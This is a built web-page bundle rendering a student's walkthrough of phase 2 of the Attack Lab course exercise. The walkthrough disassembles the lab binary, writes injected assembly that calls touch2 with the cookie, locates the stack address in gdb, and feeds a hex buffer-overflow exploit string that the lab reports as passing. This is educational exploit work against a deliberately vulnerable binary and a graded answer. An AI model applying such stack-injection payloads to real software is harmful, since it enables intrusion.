import{_ as e,X as a,Y as n,a1 as s}from"./framework-9435e890.js";const i={},d=s(`<h6 id="run" tabindex="-1"><a class="header-anchor" href="#run" aria-hidden="true">#</a> Run</h6><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>objdump <span class="token parameter variable">--disassemble</span> ctarget <span class="token operator">&gt;</span> ctarget.asm
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="read-file-cookie-txt" tabindex="-1"><a class="header-anchor" href="#read-file-cookie-txt" aria-hidden="true">#</a> Read File <code>cookie.txt</code></h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>0x3a9a6c2f
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="read-file-ctarget-asm" tabindex="-1"><a class="header-anchor" href="#read-file-ctarget-asm" aria-hidden="true">#</a> Read File <code>ctarget.asm</code></h6><div class="language-assembly line-numbers-mode" data-ext="assembly"><pre class="language-assembly"><code>...
0000000000401b28 &lt;getbuf&gt;:
  401b28:	48 83 ec 28          	sub    $0x28,%rsp
...
0000000000401b6a &lt;touch2&gt;:
...
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="write-file-phase-2-inject-s" tabindex="-1"><a class="header-anchor" href="#write-file-phase-2-inject-s" aria-hidden="true">#</a> Write File <code>phase-2-inject.s</code></h6><div class="language-assembly line-numbers-mode" data-ext="assembly"><pre class="language-assembly"><code>movl $0x3a9a6c2f, %edi
pushq $0x0000000000401b6a
retq
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-1" tabindex="-1"><a class="header-anchor" href="#run-1" aria-hidden="true">#</a> Run</h6><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>gcc <span class="token parameter variable">-c</span> phase-2-inject.s
objdump <span class="token parameter variable">--disassemble</span> phase-2-inject.o <span class="token operator">&gt;</span> phase-2-inject.asm
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="read-file-phase-2-inject-asm" tabindex="-1"><a class="header-anchor" href="#read-file-phase-2-inject-asm" aria-hidden="true">#</a> Read File <code>phase-2-inject.asm</code></h6><div class="language-assembly line-numbers-mode" data-ext="assembly"><pre class="language-assembly"><code>...
0000000000000000 &lt;.text&gt;:
   0:	bf 2f 6c 9a 3a       	mov    $0x3a9a6c2f,%edi
   5:	68 6a 1b 40 00       	pushq  $0x401b6a
   a:	c3                   	retq
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-2" tabindex="-1"><a class="header-anchor" href="#run-2" aria-hidden="true">#</a> Run</h6><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>$ gdb ctarget <span class="token parameter variable">--tui</span>
<span class="token punctuation">..</span>.
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">break</span> getbuf
Breakpoint <span class="token number">1</span> at 0x401b28: <span class="token function">file</span> buf.c, line <span class="token number">12</span>.
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> run <span class="token parameter variable">-q</span>
Starting program: /home/stu2020012872/3-lab-3-attacklab/target97/ctarget <span class="token parameter variable">-q</span>

Breakpoint <span class="token number">1</span>, getbuf <span class="token punctuation">(</span><span class="token punctuation">)</span> at buf.c:12
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> stepi
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info registers rsp
rsp            0x55668c98       0x55668c98
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="write-file-phase-2-txt" tabindex="-1"><a class="header-anchor" href="#write-file-phase-2-txt" aria-hidden="true">#</a> Write File <code>phase-2.txt</code></h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bf 2f 6c 9a 3a
68 6a 1b 40 00
c3
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
98 8c 66 55 00 00 00 00
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-3" tabindex="-1"><a class="header-anchor" href="#run-3" aria-hidden="true">#</a> Run</h6><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>./hex2raw <span class="token operator">&lt;</span> phase-2.txt <span class="token operator">&gt;</span> phase-2.in
./ctarget <span class="token parameter variable">-i</span> phase-2.in
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="terminal-output" tabindex="-1"><a class="header-anchor" href="#terminal-output" aria-hidden="true">#</a> Terminal Output</h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Cookie: 0x3a9a6c2f
Touch2!: You called touch2(0x3a9a6c2f)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,20),t=[d];function l(r,c){return a(),n("div",null,t)}const o=e(i,[["render",l],["__file","index.html.vue"]]);export{o as default};
